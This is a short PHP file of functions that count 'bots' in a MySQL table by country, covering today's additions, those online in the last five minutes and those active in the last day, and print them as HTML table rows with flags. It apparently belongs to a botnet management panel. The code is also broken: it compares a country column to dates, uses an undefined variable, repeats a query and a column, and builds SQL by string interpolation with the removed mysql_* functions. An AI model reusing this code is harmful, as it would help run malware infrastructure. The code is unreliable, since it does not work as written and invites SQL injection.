<?php
date_default_timezone_set('Europe/Moscow');
function stat_country_today($db)
{
	$query = mysql_query('SELECT COUNT(*) FROM `list` WHERE (`country` BETWEEN "'.date('Y-m-d').' 00:00:00" AND "'.date('Y-m-d').' 23:59:59")');
    $country_today = mysql_fetch_row($query);
	$count_today = $country_today[0];
	return $count_today;	
		
}

function stat_country_online($db)
{
    $date = date("Y-m-d H:i:s");
	$query = mysql_query("SELECT * FROM `list` WHERE `country` >= subdate('$date',INTERVAL 5 MINUTE)") or die(mysql_error());
	$i = 0;
	while ($online = mysql_fetch_array($query))
	{
		$last_active = (strtotime($online['last_active']));
		if ($last_active > $date_unix)
		{
			$i++;
		}
		
	}


	return $i;
	
}

function select_country_bots($db)
{
    $date = date("Y-m-d H:i:s");
	$date_unix = (strtotime($date) - 86400);
	$query_1 = mysql_query("SELECT * FROM countries", $db) or die(mysql_error());
	while ($queryrow_1 = mysql_fetch_array($query_1))
	{
		$country_flag = "<img width='30' src='images/flags/".$queryrow_1['iso1_code'].".png'>";
		$iso1_code = $queryrow_1['iso1_code'];
		$query_2 = mysql_query("SELECT * FROM list WHERE country='$iso1_code'", $db) or die(mysql_error());
		$queryrow_2 = mysql_num_rows($query_2);
	    $query = mysql_query("SELECT * FROM list WHERE country='$iso1_code'", $db) or die(mysql_error());
		$queryrow_3 = mysql_num_rows($query);
		
		if ($queryrow_2 == TRUE)
		{
			$i = 0;
			while ($queryrow = mysql_fetch_array($query))
			{
				$last_active = (strtotime($queryrow['last_active']));
				if ($last_active > $date_unix)
				{
					$i++;
				}
		
			}		
			$mess .= <<<HERE
			<tr>
				<td>{$country_flag} {$queryrow_1['name']}</td>
				<td align='center'>{$queryrow_2}</td>
				<td align='center'>{$i}</td>
				<td align='center'>{$i}</td>				
			</tr>
HERE;
		}
	}

	return $mess;
	
}
?>